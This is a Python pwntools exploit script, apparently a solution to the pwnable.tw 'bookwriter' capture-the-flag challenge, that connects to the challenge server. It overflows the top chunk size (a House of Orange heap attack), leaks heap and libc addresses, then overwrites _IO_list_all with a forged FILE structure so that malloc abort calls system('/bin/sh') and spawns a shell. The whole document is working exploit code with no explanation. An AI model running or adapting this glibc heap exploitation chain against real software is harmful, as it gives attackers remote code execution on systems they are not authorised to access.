from pwn import *
context(os = 'linux',arch = 'amd64', log_level = 'debug')
debug = 0
elf = ELF('./bookwriter')
if debug:
    p = process('./bookwriter')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') 
else:
    p = remote('chall.pwnable.tw', 10304)
    libc = ELF('./libc_64.so.6')

def add(num,content):
    p.recvuntil('Your choice :')
    p.sendline('1')
    p.recvuntil('Size of page :')
    p.sendline(str(num))
    p.recvuntil('Content :')
    p.send(content)
def view(num):
    p.recvuntil('Your choice :')
    p.sendline('2')
    p.recvuntil('Index of page :')
    p.sendline(str(num))
def edit(num,content):
    p.recvuntil('Your choice :')
    p.sendline('3')
    p.recvuntil('Index of page :')
    p.sendline(str(num))
    p.recvuntil('Content:')
    p.send(content)
def info(num,content):
    p.recvuntil('Your choice :')
    p.sendline('4')
    p.recvuntil('(yes:1 / no:0) ')
    p.sendline(str(num))
    if(num):
        p.recvuntil('Author :')
        p.sendline(content)
    else:
        pass
def leak_heap():
    p.recvuntil('Your choice :')
    p.sendline('4')
    p.recvuntil('a'*0x40)
    result = u64(p.recvline()[0:-1].ljust(8,'\0'))
    p.recvuntil('(yes:1 / no:0) ')
    p.sendline('0')
    return result #int(resultq[0:-1],10)
#gdb.attach(p,'b *0x400bdd')
p.recvuntil('Author :')
p.sendline('a'*0x40)
add(0x18,'a'*0x18)   #0
edit(0,'a'*0x18)
edit(0,'\0'*0x18+'\xe1'+'\x0f'+'\0')
heap_addr = leak_heap()
#gdb.attach(p)
for i in range(8):
    add(0x40,'kotori12')#2
view(2)
p.recvuntil('kotori12')
libc_addr  = u64(p.recvline()[0:-1].ljust(8,'\0'))

#gdb.attach(p)
libc.address = libc_addr - 88 - 0x10 - libc.symbols['__malloc_hook']
print 'libc_addr:',hex(libc_addr)
print 'system: ',hex(libc.symbols['system'])
print 'heap: ',hex(heap_addr)
edit(0,'\0'*0x290+'/bin/sh\0'+p64(0x61)+p64(libc_addr)+p64(libc.symbols['_IO_list_all']-0x10)+p64(2)+p64(3)+p64(0)*9+p64(libc.symbols['system']) + p64(0)*11 + p64(heap_addr+0x120+0x60+0x170) )

#gdb.attach(p)



p.recvuntil('Your choice :')
p.sendline('1')
p.recvuntil('Size of page :')
p.sendline(str(0x10))
p.interactive()
